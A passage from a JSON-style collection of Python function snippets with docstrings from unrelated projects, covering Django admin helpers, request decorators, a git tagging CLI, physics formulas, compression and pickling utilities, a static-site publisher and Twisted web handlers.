            "def admin_obj_link(obj, display=''):\n    \"\"\"Returns a link to the django admin change list with a filter set to\n    only the object given.\n\n    :param obj:\n        Object to create the admin change list display link for\n    :param display:\n        Text to display in the link.  Defaults to string call of the object\n    :returns:\n        Text containing HTML for a link\n    \"\"\"\n    # get the url for the change list for this object\n    url = reverse('admin:%s_%s_changelist' % (obj._meta.app_label,\n        obj._meta.model_name))\n    url += '?id__exact=%s' % obj.id\n\n    text = str(obj)\n    if display:\n        text = display\n\n    return format_html('<a href=\"{}\">{}</a>', url, text)"
        ],
        [
            "def _obj_display(obj, display=''):\n    \"\"\"Returns string representation of an object, either the default or based\n    on the display template passed in.\n    \"\"\"\n    result = ''\n    if not display:\n        result = str(obj)\n    else:\n        template = Template(display)\n        context = Context({'obj':obj})\n        result = template.render(context)\n\n    return result"
        ],
        [
            "def add_link(cls, attr, title='', display=''):\n        \"\"\"Adds a ``list_display`` attribute that appears as a link to the\n        django admin change page for the type of object being shown. Supports\n        double underscore attribute name dereferencing.\n\n        :param attr:\n            Name of the attribute to dereference from the corresponding\n            object, i.e. what will be lined to.  This name supports double\n            underscore object link referencing for ``models.ForeignKey``\n            members.\n\n        :param title:\n            Title for the column of the django admin table.  If not given it\n            defaults to a capitalized version of ``attr``\n\n        :param display:\n            What to display as the text for the link being shown.  If not\n            given it defaults to the string representation of the object for\n            the row: ``str(obj)`` .  This parameter supports django\n            templating, the context for which contains a dictionary key named\n            \"obj\" with the value being the object for the row.\n\n        Example usage:\n\n        .. code-block:: python\n\n            # ---- admin.py file ----\n\n            base = fancy_modeladmin('id')\n            base.add_link('author', 'Our Authors',\n                '{{obj.name}} (id={{obj.id}})')\n\n            @admin.register(Book)\n            class BookAdmin(base):\n                pass\n\n        The django admin change page for the Book class would have a column\n        for \"id\" and another titled \"Our Authors\". The \"Our Authors\" column\n        would have a link for each Author object referenced by \"book.author\".\n        The link would go to the Author django admin change listing. The\n        display of the link would be the name of the author with the id in\n        brakcets, e.g. \"Douglas Adams (id=42)\"\n        \"\"\"\n        global klass_count\n        klass_count += 1\n        fn_name = 'dyn_fn_%d' % klass_count\n        cls.list_display.append(fn_name)\n\n        if not title:\n            title = attr.capitalize()\n\n        # python scoping is a bit weird with default values, if it isn't\n        # referenced the inner function won't see it, so assign it for use\n        _display = display\n\n        def _link(self, obj):\n            field_obj = admin_obj_attr(obj, attr)\n            if not field_obj:\n                return ''\n\n            text = _obj_display(field_obj, _display)\n            return admin_obj_link(field_obj, text)\n        _link.short_description = title\n        _link.allow_tags = True\n        _link.admin_order_field = attr\n\n        setattr(cls, fn_name, _link)"
        ],
        [
            "def add_object(cls, attr, title='', display=''):\n        \"\"\"Adds a ``list_display`` attribute showing an object.  Supports\n        double underscore attribute name dereferencing.\n\n        :param attr:\n            Name of the attribute to dereference from the corresponding\n            object, i.e. what will be lined to.  This name supports double\n            underscore object link referencing for ``models.ForeignKey``\n            members.\n\n        :param title:\n            Title for the column of the django admin table.  If not given it\n            defaults to a capitalized version of ``attr``\n\n        :param display:\n            What to display as the text for the link being shown.  If not\n            given it defaults to the string representation of the object for\n            the row: ``str(obj)``.  This parameter supports django templating,\n            the context for which contains a dictionary key named \"obj\" with\n            the value being the object for the row.\n        \"\"\"\n        global klass_count\n        klass_count += 1\n        fn_name = 'dyn_fn_%d' % klass_count\n        cls.list_display.append(fn_name)\n\n        if not title:\n            title = attr.capitalize()\n\n        # python scoping is a bit weird with default values, if it isn't\n        # referenced the inner function won't see it, so assign it for use\n        _display = display\n\n        def _ref(self, obj):\n            field_obj = admin_obj_attr(obj, attr)\n            if not field_obj:\n                return ''\n\n            return _obj_display(field_obj, _display)\n        _ref.short_description = title\n        _ref.allow_tags = True\n        _ref.admin_order_field = attr\n\n        setattr(cls, fn_name, _ref)"
        ],
        [
            "def add_formatted_field(cls, field, format_string, title=''):\n        \"\"\"Adds a ``list_display`` attribute showing a field in the object\n        using a python %formatted string.\n\n        :param field:\n            Name of the field in the object.\n\n        :param format_string:\n            A old-style (to remain python 2.x compatible) % string formatter\n            with a single variable reference. The named ``field`` attribute\n            will be passed to the formatter using the \"%\" operator. \n\n        :param title:\n            Title for the column of the django admin table.  If not given it\n            defaults to a capitalized version of ``field``\n        \"\"\"\n        global klass_count\n        klass_count += 1\n        fn_name = 'dyn_fn_%d' % klass_count\n        cls.list_display.append(fn_name)\n\n        if not title:\n            title = field.capitalize()\n\n        # python scoping is a bit weird with default values, if it isn't\n        # referenced the inner function won't see it, so assign it for use\n        _format_string = format_string\n\n        def _ref(self, obj):\n            return _format_string % getattr(obj, field)\n        _ref.short_description = title\n        _ref.allow_tags = True\n        _ref.admin_order_field = field\n\n        setattr(cls, fn_name, _ref)"
        ],
        [
            "def post_required(method_or_options=[]):\n    \"\"\"View decorator that enforces that the method was called using POST.\n    This decorator can be called with or without parameters.  As it is\n    expected to wrap a view, the first argument of the method being wrapped is\n    expected to be a ``request`` object.\n\n    .. code-block:: python\n\n        @post_required\n        def some_view(request):\n            pass\n\n\n        @post_required(['firstname', 'lastname'])\n        def some_view(request):\n            pass\n\n    The optional parameter contains a single list which specifies the names of\n    the expected fields in the POST dictionary.  The list is not exclusive,\n    you can pass in fields that are not checked by the decorator.\n\n    :param options:\n        List of the names of expected POST keys.\n    \"\"\"\n    def decorator(method):\n        # handle wrapping or wrapping with arguments; if no arguments (and no\n        # calling parenthesis) then method_or_options will be a list,\n        # otherwise it will be the wrapped function\n        expected_fields = []\n        if not callable(method_or_options):\n            # not callable means wrapping with arguments\n            expected_fields = method_or_options\n\n        @wraps(method)\n        def wrapper(*args, **kwargs):\n            request = args[0]\n            if request.method != 'POST':\n                logger.error('POST required for this url')\n                raise Http404('only POST allowed for this url')\n\n            missing = []\n            for field in expected_fields:\n                if field not in request.POST:\n                    missing.append(field)\n\n            if missing:\n                s = 'Expected fields missing in POST: %s' % missing\n                logger.error(s)\n                raise Http404(s)\n\n            # everything verified, run the view\n            return method(*args, **kwargs)\n        return wrapper\n\n    if callable(method_or_options):\n        # callable means decorated method without options, call our decorator \n        return decorator(method_or_options)\n    return decorator"
        ],
        [
            "def json_post_required(*decorator_args):\n    \"\"\"View decorator that enforces that the method was called using POST and\n    contains a field containing a JSON dictionary. This method should\n    only be used to wrap views and assumes the first argument of the method\n    being wrapped is a ``request`` object.\n\n    .. code-block:: python\n\n        @json_post_required('data', 'json_data')\n        def some_view(request):\n            username = request.json_data['username']\n\n    :param field:\n        The name of the POST field that contains a JSON dictionary\n    :param request_name:\n        [optional] Name of the parameter on the request to put the\n        deserialized JSON data. If not given the field name is used\n\n    \"\"\"\n    def decorator(method):\n        @wraps(method)\n        def wrapper(*args, **kwargs):\n            field = decorator_args[0]\n            if len(decorator_args) == 2:\n                request_name = decorator_args[1]\n            else:\n                request_name = field\n\n            request = args[0]\n            if request.method != 'POST':\n                logger.error('POST required for this url')\n                raise Http404('only POST allowed for this url')\n\n            if field not in request.POST:\n                s = 'Expected field named %s in POST' % field\n                logger.error(s)\n                raise Http404(s)\n\n            # deserialize the JSON and put it in the request\n            setattr(request, request_name, json.loads(request.POST[field]))\n\n            # everything verified, run the view\n            return method(*args, **kwargs)\n        return wrapper\n    return decorator"
        ],
        [
            "def sigma_prime(self):\n        \"\"\"\n        Divergence of matched beam\n        \"\"\"\n        return _np.sqrt(self.emit/self.beta(self.E))"
        ],
        [
            "def n_p(self):\n        \"\"\"\n        The plasma density in SI units.\n        \"\"\"\n        return 2*_sltr.GeV2joule(self.E)*_spc.epsilon_0 / (self.beta*_spc.elementary_charge)**2"
        ],
        [
            "def main(target, label):\n    \"\"\"\n    Semver tag triggered deployment helper\n    \"\"\"\n    check_environment(target, label)\n\n    click.secho('Fetching tags from the upstream ...')\n    handler = TagHandler(git.list_tags())\n\n    print_information(handler, label)\n\n    tag = handler.yield_tag(target, label)\n    confirm(tag)"
        ],
        [
            "def check_environment(target, label):\n    \"\"\"\n    Performs some environment checks prior to the program's execution\n    \"\"\"\n    if not git.exists():\n        click.secho('You must have git installed to use yld.', fg='red')\n        sys.exit(1)\n\n    if not os.path.isdir('.git'):\n        click.secho('You must cd into a git repository to use yld.', fg='red')\n        sys.exit(1)\n\n    if not git.is_committed():\n        click.secho('You must commit or stash your work before proceeding.',\n                    fg='red')\n        sys.exit(1)\n\n    if target is None and label is None:\n        click.secho('You must specify either a target or a label.', fg='red')\n        sys.exit(1)"
        ],
        [
            "def print_information(handler, label):\n    \"\"\"\n    Prints latest tag's information\n    \"\"\"\n    click.echo('=> Latest stable: {tag}'.format(\n        tag=click.style(str(handler.latest_stable or 'N/A'), fg='yellow' if\n                        handler.latest_stable else 'magenta')\n    ))\n\n    if label is not None:\n        latest_revision = handler.latest_revision(label)\n        click.echo('=> Latest relative revision ({label}): {tag}'.format(\n            label=click.style(label, fg='blue'),\n            tag=click.style(str(latest_revision or 'N/A'),\n                                fg='yellow' if latest_revision else 'magenta')\n        ))"
        ],
        [
            "def confirm(tag):\n    \"\"\"\n    Prompts user before proceeding\n    \"\"\"\n    click.echo()\n    if click.confirm('Do you want to create the tag {tag}?'.format(\n            tag=click.style(str(tag), fg='yellow')),\n        default=True, abort=True):\n        git.create_tag(tag)\n\n    if click.confirm(\n        'Do you want to push the tag {tag} into the upstream?'.format(\n            tag=click.style(str(tag), fg='yellow')),\n        default=True):\n        git.push_tag(tag)\n        click.echo('Done!')\n    else:\n        git.delete_tag(tag)\n        click.echo('Aborted!')"
        ],
        [
            "def get(f, key, default=None):\n    \"\"\"\n    Gets an array from datasets.\n\n    .. versionadded:: 1.4\n    \"\"\"\n\n    if key in f.keys():\n        val = f[key].value\n\n        if default is None:\n            return val\n        else:\n            if _np.shape(val) == _np.shape(default):\n                return val\n\n    return default"
        ],
        [
            "def get_state(self):\n        \"\"\"Get the current directory state\"\"\"\n        return [os.path.join(dp, f)\n                for dp, _, fn in os.walk(self.dir)\n                for f in fn]"
        ],
        [
            "def tick(self):\n        \"\"\"Add one tick to progress bar\"\"\"\n        self.current += 1\n        if self.current == self.factor:\n            sys.stdout.write('+')\n            sys.stdout.flush()\n            self.current = 0"
        ],
        [
            "def push(self, k):\n        \"\"\"Push k to the top of the list\n\n        >>> l = DLL()\n        >>> l.push(1)\n        >>> l\n        [1]\n        >>> l.push(2)\n        >>> l\n        [2, 1]\n        >>> l.push(3)\n        >>> l\n        [3, 2, 1]\n        \"\"\"\n        if not self._first:\n            # first item\n            self._first = self._last = node = DLL.Node(k)\n        elif self._first.value == k:\n            # it's already at the top\n            return\n        else:\n            try:\n                self.delete(k) # in case we have it already\n            except KeyError:\n                pass\n            self._first = node = self._first.insert_before(k)\n        self._index[k] = node\n        self._size += 1"
        ],
        [
            "def increment(cls, name):\n        \"\"\"Call this method to increment the named counter.  This is atomic on\n        the database.\n\n        :param name:\n            Name for a previously created ``Counter`` object \n        \"\"\"\n        with transaction.atomic():\n            counter = Counter.objects.select_for_update().get(name=name)\n            counter.value += 1\n            counter.save()\n\n        return counter.value"
        ],
        [
            "def print_loading(self, wait, message):\n        \"\"\"\n        print loading message on screen\n\n        .. note::\n\n            loading message only write to `sys.stdout`\n\n\n        :param int wait: seconds to wait\n        :param str message: message to print\n        :return: None\n        \"\"\"\n        tags = ['\\\\', '|', '/', '-']\n\n        for i in range(wait):\n            time.sleep(0.25)\n            sys.stdout.write(\"%(message)s... %(tag)s\\r\" % {\n                'message': message,\n                'tag': tags[i % 4]\n            })\n\n            sys.stdout.flush()\n            pass\n\n        sys.stdout.write(\"%s... Done...\\n\" % message)\n        sys.stdout.flush()\n        pass"
        ],
        [
            "def warn_message(self, message, fh=None, prefix=\"[warn]:\", suffix=\"...\"):\n        \"\"\"\n        print warn type message,\n        if file handle is `sys.stdout`, print color message\n\n\n        :param str message: message to print\n        :param file fh: file handle,default is `sys.stdout`\n        :param str prefix: message prefix,default is `[warn]`\n        :param str suffix: message suffix ,default is `...`\n        :return: None\n        \"\"\"\n\n        msg = prefix + message + suffix\n        fh = fh or sys.stdout\n\n        if fh is sys.stdout:\n            termcolor.cprint(msg, color=\"yellow\")\n        else:\n            fh.write(msg)\n\n        pass"
        ],
        [
            "def error_message(self, message, fh=None, prefix=\"[error]:\",\n                      suffix=\"...\"):\n        \"\"\"\n        print error type message\n        if file handle is `sys.stderr`, print color message\n\n        :param str message: message to print\n        :param file fh: file handle, default is `sys.stdout`\n        :param str prefix: message prefix,default is `[error]`\n        :param str suffix: message suffix ,default is '...'\n        :return: None\n        \"\"\"\n\n        msg = prefix + message + suffix\n        fh = fh or sys.stderr\n\n        if fh is sys.stderr:\n            termcolor.cprint(msg, color=\"red\")\n        else:\n            fh.write(msg)\n        pass"
        ],
        [
            "def system(self, cmd, fake_code=False):\n        \"\"\"\n        a built-in wrapper make dry-run easier.\n        you should use this instead use `os.system`\n\n        .. note::\n\n            to use it,you need add '--dry-run' option in\n            your argparser options\n\n\n        :param str cmd: command to execute\n        :param bool fake_code: only display command\n            when is True,default is False\n        :return:\n        \"\"\"\n        try:\n            if self.options.dry_run:\n                def fake_system(cmd):\n                    self.print_message(cmd)\n                    return fake_code\n\n                return fake_system(cmd)\n        except AttributeError:\n            self.logger.warnning(\"fake mode enabled,\"\n                                 \"but you don't set '--dry-run' option \"\n                                 \"in your argparser options\")\n            pass\n\n        return os.system(cmd)"
        ],
        [
            "def url_correct(self, point, auth=None, export=None):\n        '''\n        Returns a Corrected URL to be used for a Request\n        as per the REST API.\n        '''\n        newUrl = self.__url + point + '.json'\n        if auth or export:\n            newUrl += \"?\"\n        if auth:\n            newUrl += (\"auth=\" + auth)\n        if export:\n            if not newUrl.endswith('?'):\n                newUrl += \"&\"\n            newUrl += \"format=export\"\n        return newUrl"
        ],
        [
            "def main():\n    \"\"\"\n    Main method.\n\n    This method holds what you want to execute when\n    the script is run on command line.\n    \"\"\"\n    args = get_arguments()\n    setup_logging(args)\n\n    version_path = os.path.abspath(os.path.join(\n        os.path.dirname(__file__),\n        '..',\n        '..',\n        '.VERSION'\n    ))\n\n    try:\n        version_text = open(version_path).read().strip()\n    except Exception:\n        print('Could not open or read the .VERSION file')\n        sys.exit(1)\n\n    try:\n        semver.parse(version_text)\n    except ValueError:\n        print(('The .VERSION file contains an invalid '\n               'version: \"{}\"').format(version_text))\n        sys.exit(1)\n\n    new_version = version_text\n    if args.version:\n        try:\n            if semver.parse(args.version):\n                new_version = args.version\n        except Exception:\n            print('Could not parse \"{}\" as a version'.format(args.version))\n            sys.exit(1)\n    elif args.bump_major:\n        new_version = semver.bump_major(version_text)\n    elif args.bump_minor:\n        new_version = semver.bump_minor(version_text)\n    elif args.bump_patch:\n        new_version = semver.bump_patch(version_text)\n\n    try:\n        with open(version_path, 'w') as version_file:\n            version_file.write(new_version)\n    except Exception:\n        print('Could not write the .VERSION file')\n        sys.exit(1)\n    print(new_version)"
        ],
        [
            "def pickle(obj, filepath):\n    \"\"\"Pickle and compress.\"\"\"\n    arr = pkl.dumps(obj, -1)\n    with open(filepath, 'wb') as f:\n        s = 0\n        while s < len(arr):\n            e = min(s + blosc.MAX_BUFFERSIZE, len(arr))\n            carr = blosc.compress(arr[s:e], typesize=8)\n            f.write(carr)\n            s = e"
        ],
        [
            "def unpickle(filepath):\n    \"\"\"Decompress and unpickle.\"\"\"\n    arr = []\n    with open(filepath, 'rb') as f:\n        carr = f.read(blosc.MAX_BUFFERSIZE)\n        while len(carr) > 0:\n            arr.append(blosc.decompress(carr))\n            carr = f.read(blosc.MAX_BUFFERSIZE)\n    return pkl.loads(b\"\".join(arr))"
        ],
        [
            "def contact(request):\n    \"\"\"Displays the contact form and sends the email\"\"\"\n    form = ContactForm(request.POST or None)\n    if form.is_valid():\n        subject = form.cleaned_data['subject']\n        message = form.cleaned_data['message']\n        sender = form.cleaned_data['sender']\n        cc_myself = form.cleaned_data['cc_myself']\n\n        recipients = settings.CONTACTFORM_RECIPIENTS\n        if cc_myself:\n            recipients.append(sender)\n\n        send_mail(getattr(settings, \"CONTACTFORM_SUBJECT_PREFIX\", '') + subject, message, sender, recipients)\n\n        return render(request, 'contactform/thanks.html')\n\n    return render( request, 'contactform/contact.html', {'form': form})"
        ],
        [
            "def load_gitconfig(self):\n        \"\"\"\n        try use gitconfig info.\n        author,email etc.\n        \"\"\"\n        gitconfig_path = os.path.expanduser('~/.gitconfig')\n\n        if os.path.exists(gitconfig_path):\n            parser = Parser()\n            parser.read(gitconfig_path)\n            parser.sections()\n            return parser\n\n        pass"
        ],
        [
            "def add_arguments(cls):\n        \"\"\"\n        Init project.\n        \"\"\"\n        return [\n            (('--yes',), dict(action='store_true', help='clean .git repo')),\n            (('--variable', '-s'),\n             dict(nargs='+', help='set extra variable,format is name:value')),\n            (('--skip-builtin',),\n             dict(action='store_true', help='skip replace builtin variable')),\n        ]"
        ],
        [
            "def run(self, options):\n        \"\"\"\n        In general, you don't need to overwrite this method.\n\n        :param options:\n        :return:\n        \"\"\"\n\n        self.set_signal()\n        self.check_exclusive_mode()\n\n        slot = self.Handle(self)\n\n        # start thread\n        i = 0\n        while i < options.threads:\n            t = threading.Thread(target=self.worker, args=[slot])\n            # only set daemon when once is False\n            if options.once is True or options.no_daemon is True:\n                t.daemon = False\n            else:\n                t.daemon = True\n\n            t.start()\n            i += 1\n\n        # waiting thread\n        if options.once is False:\n            while True:\n                if threading.active_count() > 1:\n                    sleep(1)\n                else:\n                    if threading.current_thread().name == \"MainThread\":\n                        sys.exit(0)\n\n        pass"
        ],
        [
            "def combine_filenames(filenames, max_length=40):\n    \"\"\"Return a new filename to use as the combined file name for a\n    bunch of files, based on the SHA of their contents.\n    A precondition is that they all have the same file extension\n\n    Given that the list of files can have different paths, we aim to use the\n    most common path.\n\n    Example:\n      /somewhere/else/foo.js\n      /somewhere/bar.js\n      /somewhere/different/too/foobar.js\n    The result will be\n      /somewhere/148713695b4a4b9083e506086f061f9c.js\n\n    Another thing to note, if the filenames have timestamps in them, combine\n    them all and use the highest timestamp.\n\n    \"\"\"\n    # Get the SHA for each file, then sha all the shas.\n\n    path = None\n    names = []\n    extension = None\n    timestamps = []\n    shas = []\n    filenames.sort()\n    concat_names = \"_\".join(filenames)\n    if concat_names in COMBINED_FILENAMES_GENERATED:\n        return COMBINED_FILENAMES_GENERATED[concat_names]\n\n    for filename in filenames:\n        name = os.path.basename(filename)\n        if not extension:\n            extension = os.path.splitext(name)[1]\n        elif os.path.splitext(name)[1] != extension:\n            raise ValueError(\"Can't combine multiple file extensions\")\n\n        for base in MEDIA_ROOTS:\n            try:\n                shas.append(md5(os.path.join(base, filename)))\n                break\n            except IOError:\n                pass\n\n\n        if path is None:\n            path = os.path.dirname(filename)\n        else:\n            if len(os.path.dirname(filename)) < len(path):\n                path = os.path.dirname(filename)\n\n    m = hashlib.md5()\n    m.update(\",\".join(shas))\n\n    new_filename = \"%s-inkmd\" % m.hexdigest()\n\n    new_filename = new_filename[:max_length]\n    new_filename += extension\n    COMBINED_FILENAMES_GENERATED[concat_names] = new_filename\n\n    return os.path.join(path, new_filename)"
        ],
        [
            "def apply_orientation(im):\n    \"\"\"\n    Extract the oritentation EXIF tag from the image, which should be a PIL Image instance,\n    and if there is an orientation tag that would rotate the image, apply that rotation to\n    the Image instance given to do an in-place rotation.\n\n    :param Image im: Image instance to inspect\n    :return: A possibly transposed image instance\n    \"\"\"\n\n    try:\n        kOrientationEXIFTag = 0x0112\n        if hasattr(im, '_getexif'): # only present in JPEGs\n            e = im._getexif()       # returns None if no EXIF data\n            if e is not None:\n                #log.info('EXIF data found: %r', e)\n                orientation = e[kOrientationEXIFTag]\n                f = orientation_funcs[orientation]\n                return f(im)\n    except:\n        # We'd be here with an invalid orientation value or some random error?\n        pass # log.exception(\"Error applying EXIF Orientation tag\")\n    return im"
        ],
        [
            "def write():\n    \"\"\"Start a new piece\"\"\"\n    click.echo(\"Fantastic. Let's get started. \")\n    title = click.prompt(\"What's the title?\")\n\n    # Make sure that title doesn't exist.\n    url = slugify(title)\n    url = click.prompt(\"What's the URL?\", default=url)\n\n    # Make sure that title doesn't exist.\n    click.echo(\"Got it. Creating %s...\" % url)\n    scaffold_piece(title, url)"
        ],
        [
            "def scaffold():\n    \"\"\"Start a new site.\"\"\"\n    click.echo(\"A whole new site? Awesome.\")\n    title = click.prompt(\"What's the title?\")\n    url = click.prompt(\"Great. What's url? http://\")\n\n    # Make sure that title doesn't exist.\n    click.echo(\"Got it. Creating %s...\" % url)"
        ],
        [
            "def publish():\n    \"\"\"Publish the site\"\"\"\n    try:\n        build_site(dev_mode=False, clean=True)\n        click.echo('Deploying the site...')\n        # call(\"firebase deploy\", shell=True)\n        call(\"rsync -avz -e ssh --progress %s/ %s\" % (BUILD_DIR, CONFIG[\"scp_target\"],), shell=True)\n        if \"cloudflare\" in CONFIG and \"purge\" in CONFIG[\"cloudflare\"] and CONFIG[\"cloudflare\"][\"purge\"]:\n            do_purge()\n    except (KeyboardInterrupt, SystemExit):\n        raise\n        sys.exit(1)"
        ],
        [
            "def get_branches(self):\n        \"\"\"Returns a list of the branches\"\"\"\n        return [self._sanitize(branch)\n                for branch in self._git.branch(color=\"never\").splitlines()]"
        ],
        [
            "def get_current_branch(self):\n        \"\"\"Returns the currently active branch\"\"\"\n        return next((self._sanitize(branch)\n                     for branch in self._git.branch(color=\"never\").splitlines()\n                     if branch.startswith('*')),\n                    None)"
        ],
        [
            "def create_patch(self, from_tag, to_tag):\n        \"\"\"Create a patch between tags\"\"\"\n        return str(self._git.diff('{}..{}'.format(from_tag, to_tag), _tty_out=False))"
        ],
        [
            "def one(func, n=0):\n    \"\"\"\n    Create a callable that applies ``func`` to a value in a sequence.\n\n    If the value is not a sequence or is an empty sequence then ``None`` is\n    returned.\n\n    :type  func: `callable`\n    :param func: Callable to be applied to each result.\n\n    :type  n: `int`\n    :param n: Index of the value to apply ``func`` to.\n    \"\"\"\n    def _one(result):\n        if _isSequenceTypeNotText(result) and len(result) > n:\n            return func(result[n])\n        return None\n    return maybe(_one)"
        ],
        [
            "def many(func):\n    \"\"\"\n    Create a callable that applies ``func`` to every value in a sequence.\n\n    If the value is not a sequence then an empty list is returned.\n\n    :type  func: `callable`\n    :param func: Callable to be applied to the first result.\n    \"\"\"\n    def _many(result):\n        if _isSequenceTypeNotText(result):\n            return map(func, result)\n        return []\n    return maybe(_many, default=[])"
        ],
        [
            "def Text(value, encoding=None):\n    \"\"\"\n    Parse a value as text.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat ``bytes`` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `unicode`\n    :return: Parsed text or ``None`` if ``value`` is neither `bytes` nor\n        `unicode`.\n    \"\"\"\n    if encoding is None:\n        encoding = 'utf-8'\n    if isinstance(value, bytes):\n        return value.decode(encoding)\n    elif isinstance(value, unicode):\n        return value\n    return None"
        ],
        [
            "def Integer(value, base=10, encoding=None):\n    \"\"\"\n    Parse a value as an integer.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse\n\n    :type  base: `unicode` or `bytes`\n    :param base: Base to assume ``value`` is specified in.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat ``bytes`` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `int`\n    :return: Parsed integer or ``None`` if ``value`` could not be parsed as an\n        integer.\n    \"\"\"\n    try:\n        return int(Text(value, encoding), base)\n    except (TypeError, ValueError):\n        return None"
        ],
        [
            "def Boolean(value, true=(u'yes', u'1', u'true'), false=(u'no', u'0', u'false'),\n            encoding=None):\n    \"\"\"\n    Parse a value as a boolean.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse.\n\n    :type  true: `tuple` of `unicode`\n    :param true: Values to compare, ignoring case, for ``True`` values.\n\n    :type  false: `tuple` of `unicode`\n    :param false: Values to compare, ignoring case, for ``False`` values.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat `bytes` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `bool`\n    :return: Parsed boolean or ``None`` if ``value`` did not match ``true`` or\n        ``false`` values.\n    \"\"\"\n    value = Text(value, encoding)\n    if value is not None:\n        value = value.lower().strip()\n    if value in true:\n        return True\n    elif value in false:\n        return False\n    return None"
        ],
        [
            "def Delimited(value, parser=Text, delimiter=u',', encoding=None):\n    \"\"\"\n    Parse a value as a delimited list.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse.\n\n    :type  parser: `callable` taking a `unicode` parameter\n    :param parser: Callable to map over the delimited text values.\n\n    :type  delimiter: `unicode`\n    :param delimiter: Delimiter text.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat `bytes` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `list`\n    :return: List of parsed values.\n    \"\"\"\n    value = Text(value, encoding)\n    if value is None or value == u'':\n        return []\n    return map(parser, value.split(delimiter))"
        ],
        [
            "def Timestamp(value, _divisor=1., tz=UTC, encoding=None):\n    \"\"\"\n    Parse a value as a POSIX timestamp in seconds.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse, which should be the number of seconds\n        since the epoch.\n\n    :type  _divisor: `float`\n    :param _divisor: Number to divide the value by.\n\n    :type  tz: `tzinfo`\n    :param tz: Timezone, defaults to UTC.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat `bytes` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `datetime.datetime`\n    :return: Parsed datetime or ``None`` if ``value`` could not be parsed.\n    \"\"\"\n    value = Float(value, encoding)\n    if value is not None:\n        value = value / _divisor\n        return datetime.fromtimestamp(value, tz)\n    return None"
        ],
        [
            "def parse(expected, query):\n    \"\"\"\n    Parse query parameters.\n\n    :type  expected: `dict` mapping `bytes` to `callable`\n    :param expected: Mapping of query argument names to argument parsing\n        callables.\n\n    :type  query: `dict` mapping `bytes` to `list` of `bytes`\n    :param query: Mapping of query argument names to lists of argument values,\n        this is the form that Twisted Web's `IRequest.args\n        <twisted:twisted.web.iweb.IRequest.args>` value takes.\n\n    :rtype: `dict` mapping `bytes` to `object`\n    :return: Mapping of query argument names to parsed argument values.\n    \"\"\"\n    return dict(\n        (key, parser(query.get(key, [])))\n        for key, parser in expected.items())"
        ],
        [
            "def put(self, metrics):\n        \"\"\"\n        Put metrics to cloudwatch. Metric shoult be instance or list of\n        instances of CloudWatchMetric\n        \"\"\"\n        if type(metrics) == list:\n            for metric in metrics:\n                self.c.put_metric_data(**metric)\n        else:\n            self.c.put_metric_data(**metrics)"
        ],
        [
            "def _renderResource(resource, request):\n    \"\"\"\n    Render a given resource.\n\n    See `IResource.render <twisted:twisted.web.resource.IResource.render>`.\n    \"\"\"\n    meth = getattr(resource, 'render_' + nativeString(request.method), None)\n    if meth is None:\n        try:\n            allowedMethods = resource.allowedMethods\n        except AttributeError:\n            allowedMethods = _computeAllowedMethods(resource)\n        raise UnsupportedMethod(allowedMethods)\n    return meth(request)"
        ],
        [
            "def _adaptToResource(self, result):\n        \"\"\"\n        Adapt a result to `IResource`.\n\n        Several adaptions are tried they are, in order: ``None``,\n        `IRenderable <twisted:twisted.web.iweb.IRenderable>`, `IResource\n        <twisted:twisted.web.resource.IResource>`, and `URLPath\n        <twisted:twisted.python.urlpath.URLPath>`. Anything else is returned as\n        is.\n\n        A `URLPath <twisted:twisted.python.urlpath.URLPath>` is treated as\n        a redirect.\n        \"\"\"\n        if result is None:\n            return NotFound()\n\n        spinneretResource = ISpinneretResource(result, None)\n        if spinneretResource is not None:\n            return SpinneretResource(spinneretResource)\n\n        renderable = IRenderable(result, None)\n        if renderable is not None:\n            return _RenderableResource(renderable)\n\n        resource = IResource(result, None)\n        if resource is not None:\n            return resource\n\n        if isinstance(result, URLPath):\n            return Redirect(str(result))\n\n        return result"
        ],
        [
            "def _handleRenderResult(self, request, result):\n        \"\"\"\n        Handle the result from `IResource.render`.\n\n        If the result is a `Deferred` then return `NOT_DONE_YET` and add\n        a callback to write the result to the request when it arrives.\n        \"\"\"\n        def _requestFinished(result, cancel):\n            cancel()\n            return result\n\n        if not isinstance(result, Deferred):\n            result = succeed(result)\n\n        def _whenDone(result):\n            render = getattr(result, 'render', lambda request: result)\n            renderResult = render(request)\n            if renderResult != NOT_DONE_YET:\n                request.write(renderResult)\n                request.finish()\n            return result\n        request.notifyFinish().addBoth(_requestFinished, result.cancel)\n        result.addCallback(self._adaptToResource)\n        result.addCallback(_whenDone)\n        result.addErrback(request.processingFailed)\n        return NOT_DONE_YET"
        ],
        [
            "def _negotiateHandler(self, request):\n        \"\"\"\n        Negotiate a handler based on the content types acceptable to the\n        client.\n\n        :rtype: 2-`tuple` of `twisted.web.iweb.IResource` and `bytes`\n        :return: Pair of a resource and the content type.\n        \"\"\"\n        accept = _parseAccept(request.requestHeaders.getRawHeaders('Accept'))\n        for contentType in accept.keys():\n            handler = self._acceptHandlers.get(contentType.lower())\n            if handler is not None:\n                return handler, handler.contentType\n\n        if self._fallback:\n            handler = self._handlers[0]\n            return handler, handler.contentType\n        return NotAcceptable(), None"
        ],
        [
            "def _parseAccept(headers):\n    \"\"\"\n    Parse and sort an ``Accept`` header.\n\n    The header is sorted according to the ``q`` parameter for each header value.\n\n    @rtype: `OrderedDict` mapping `bytes` to `dict`\n    @return: Mapping of media types to header parameters.\n    \"\"\"\n    def sort(value):\n        return float(value[1].get('q', 1))\n    return OrderedDict(sorted(_splitHeaders(headers), key=sort, reverse=True))"
        ],
        [
